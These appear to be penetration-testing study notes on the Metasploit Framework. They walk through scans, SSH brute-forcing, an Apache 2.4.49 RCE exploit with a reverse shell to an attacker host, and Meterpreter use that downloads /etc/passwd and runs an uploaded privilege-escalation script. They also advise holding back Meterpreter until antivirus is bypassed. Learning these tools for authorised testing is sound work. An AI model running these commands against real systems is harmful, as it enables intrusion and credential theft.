# Metasploit

The penetration Metasploit Framework `https://github.com/rapid7/metasploit-framework` is an advanced platform for developing, testing, and using exploit code. The tool features and use-cases contain components for information gathering, vulnerability research and development, client-side attacks, post-exploitation.

Similar tools

* .NET Covenant C2 Platform `https://github.com/cobbr/Covenant/blob/master/README.md`
* .PS1 Empire Post-Exploitation Framework `https://github.com/BC-SECURITY/Empire`
* Cobalt Strike C2 Platform (commercial tool) `https://www.cobaltstrike.com/`

## Getting Familiar with Metasploit

Startup

```bash
sudo msfdb init
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml
sudo systemctl enable postgresql
sudo msfconsole
mfs6 > db_status
[*] Connected to msf. Connection type: postgresql.
mfs6 > 
help
show -h
 encoders, nops, exploits, payloads, auxiliary, post, plugins, info, options
```

Workspaces

List, add new and activate workspaces

* -l list workspaces
* -a workspace to add
* -d workspace to delete
* -v verbose workspace listing
* workspace [name] switch to workspace

```plain
workspace
workspace -a oscppen200
workspace -d oscppen100
workspace oscppen200
```

DB NMap Wrapper

```plain
db_nmap --help
 [*] Usage: db_nmap [--save | [--help | -h]] [nmap options]

db_nmap -A 192.168.55.110

hosts

  address         mac  name  os_name       os_flavor  os_sp  purpose
  -------         ---  ----  -------       ---------  -----  -------
  192.168.55.110             Windows 2016                    server

services
services -p 21

  host            port  proto  name           state  info
  ----            ----  -----  ----           -----  ----
  192.168.55.110  21    tcp    ftp            open
```

### Auxiliary Modules (Aux)

Show, Search and Use auxillary modules

The modules all follow a common slash-delimited hierarchical syntax (module type/os, vendor, app, operation, or protocol/module name), which makes it easy to explore and use the modules.

SMB Scanner

```plain
show auxiliary

# Scan SMB Version
search type:auxiliary smb

use auxiliary/scanner/smb/smb_version
# or index
use 56

msf6 auxiliary(scanner/smb/smb_version) >
info
show options

services -p 445 --rhosts
RHOSTS => 192.168.50.202
# or set manually
set RHOSTS 192.168.55.110
unset RHOSTS

run 
  [*] Auxiliary module execution completed

vulns
  7429/overview-of-server-message-block-signing
```

Brute Force SSH Logins

```plain
show auxiliary
search type:auxiliary ssh
  16  auxiliary/scanner/ssh/ssh_login                                        normal  No     SSH Login Check Scanner

use auxiliary/scanner/ssh/ssh_login

msf6 auxiliary(scanner/ssh/ssh_login) >

show options
set RHOSTS 192.168.55.110
set RPORT 22
set USERNAME user
set PASS_FILE /usr/share/wordlists/rockyou.txt

run
  [*] 192.168.55.110:22 - Starting bruteforce
  [+] 192.168.55.110:22 - Success: 'someuser:mypasswd' 'uid=1001(george)

creds
  host            origin          service       public  private    realm
  ----            ------          -------       ------  -------    ----
  192.168.50.201  192.168.50.201  22/tcp (ssh)  user    password         Password
```

### Exploit Modules

```plain
workspace -a exploits

show exploits
search type:exploits Apache 2.4.49 
use exploit/multi/http/apache_normalize_path_rce

msf6 exploit(multi/http/apache_normalize_path_rce) >
info
  
   Available targets:
   Id  Name
   --  ----
   0   Automatic (Dropper)
   1   Unix Command (In-Memory)

   Check supported:
   Yes

   Indicators of compromise:
   ...

show options

  Module options (exploit/multi/http/apache_normalize_path_rce):
  ...
  Payload options (linux/x64/meterpreter/reverse_tcp):

set SSL false
set RPORT 80
set RHOSTS 192.168.55.110
set LPORT 443
set LHOST Attacker-IP

set PAYLOAD linux/x64/shell_reverse_tcp
  payload => linux/x64/shell_reverse_tcp

check
  [*] Using auxiliary/scanner/http/apache_normalize_path as check
  [+] 192.168.118.55:110 - The target is vulnerable.

run
  [*] Command shell session 1 opened (192.168.45.198:4444 -> 192.168.55.110:53190)
id
pwd
```

### Session and Jobs

Sessions are used to interact and manage access to successfully exploited targets, while jobs are used to run modules or features in the background.

List and interact with and kill sessions

* -l list
* -i index interact with session
* -k index kill session

```plain
# Session to background or close N
^Z
Background session 2? [y/N]  N

sessions -l
  2         shell x64/linux               192.168.55.110:4443 -> 192.168.50.16:35534 (192.168.50.16)

sessions -i 2
  [*] Starting interaction with 2..

 sessions -k 2
```

Run as job in the Background

```plain
run -j
sessions -l
sessions -i 2
```

## Metasploit Payloads

A *non-staged payload* is a 'all-in-one' solution, more stable but **BIGGER**, because it contains the exploit and the shell code. A *staged payload* consists of **SMALLER** stage part and larger rest of the exploit.

Scenarios

* Exploit space limitations -> *staged payload*
* Avoid anti virus detection -> *staged payload*
* Avoid network traffic -> *non-staged payload*
* Use with meterpreter -> *non-staged payload*
* else *non-staged payload*

```plain
msf6 exploit(multi/http/apache_normalize_path_rce) >

# '/' after shell indicates stage payloads
show payloads
search type:payload
search type:payload "windows x86 staged reverse TCP"
search type:payload "linux x64 staged reverse TCP"


 #   Name                                              Disclosure Date  Rank    Check  Description
 -   ----                                              ---------------  ----    -----  -----------
 15  payload/linux/x64/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
 20  payload/linux/x64/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
 ...

 set payload 15
 show options
 run

 [*] Sending stage (38 bytes) to 192.168.55.110

```

## Meterpreter Payload

Meterpreter and all of the extensions that it loads are executed entirely from **MEMORY** and communication is **ENCRYPTED** by default. Its purpose is to provide complex and advanced features that would otherwise be tedious to implement purely in assembly. The extensions can be provided via dynamic linked libraries using Reflective DDL Injection (RDI) metsrv.dll and meterpreter.{jar,php,py}.

**Warning**: **Detection rates of Meterpreter payloads are quite high** by security technologies such as antivirus solutions. We should **always attempt to obtain an initial foothold with a raw TCP shell** and then deploy a Meterpreter shell as soon as we have disabled or bypassed potential security technologies.

Scenarios

* 🖥️ Multiple channel communications
* 🔒 Encrypted communications channels
* 📁 Transfer files to and from the target system
* 🔀 Pivot—use a hacked machine to attack others in the same network
* 🎛️ Interact with the machine via command execution, shell access, or graphical

```plain
msf6 exploit(multi/http/apache_normalize_path_rce) >
show payloads

search type:payload linux x64 meterpreter

  #   Name                                                   Disclosure Date  Rank    Check  Description
  -   ----                                                   ---------------  ----    -----  -----------
  11  payload/linux/x64/meterpreter_reverse_http             .                normal  No     Linux Meterpreter, Reverse HTTP Inline
  13  payload/linux/x64/meterpreter_reverse_https            .                normal  No     Linux Meterpreter, Reverse HTTPS Inline
  14  payload/linux/x64/meterpreter_reverse_tcp              .                normal  No     Linux Meterpreter, Reverse TCP Inline


set payload linux/x64/meterpreter_reverse_tcp
run

meterpreter > 
help
sysinfo 
getuid

shell
 Channel 1 created.
whoami
^Z

exit
```

List and interact with and kill channels

* -l list
* -i index interact with session
* -k index kill session

```plain
meterpreter >
channel -l
channel -i 1
channel -k 1
```

File System Commands download, upload and System Commands executions

```plain
meterpreter > help

  Stdapi: File system Command

  Command       Description
  -------       -----------
  cat           Read the contents of a file to the screen
  ...
  chmod         Change the permissions of a file
  download      Download a file or directory
  edit          Edit a file
  lcat          Read the contents of a local file to the screen
  lcd           Change local working directory
  ls            List files
  rm            Delete the specified file
  rmdir         Remove directory
  search        Search for files
  upload        Upload a file or directory

  Stdapi: System Commands
  =======================

  Command                   Description
  -------                   -----------
  execute                   Execute a command
  getenv                    Get one or more environment variable values
  getpid                    Get the current process identifier
  getuid                    Get the user that the server is running as
  kill                      Terminate a process
  pgrep                     Filter processes by name
  pkill                     Terminate processes by name
  ps                        List running processes
  shell                     Drop into a system command shell
  sysinfo                   Gets information about the remote system, such as OS


meterpreter >  
lcd /home/kali/Downloads
search -f passwd
download /etc/passwd
lcat /home/kali/Downloads/passwd
upload /usr/bin/unix-privesc-check /tmp/
ls /tmp
chmod 777 /tmp/unix-privesc-check
execute /tmp/unix-privesc-check
```

Meterpreter HTTPS

```plain
msf6 exploit(multi/http/apache_normalize_path_rce) >
show payloads

set payload payload/linux/x64/meterpreter_reverse_https
show options

  Payload options (linux/x64/meterpreter_reverse_https):

  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  LHOST  192.168.119.2    yes       The local listener hostname
  LPORT  4444             yes       The local listener port
  LURI                    no        The HTTP Path, "/" by default

run
```

## Executeable Payloads


## Performing Post-Exploitation with Metasploit

## Automating Metasploit
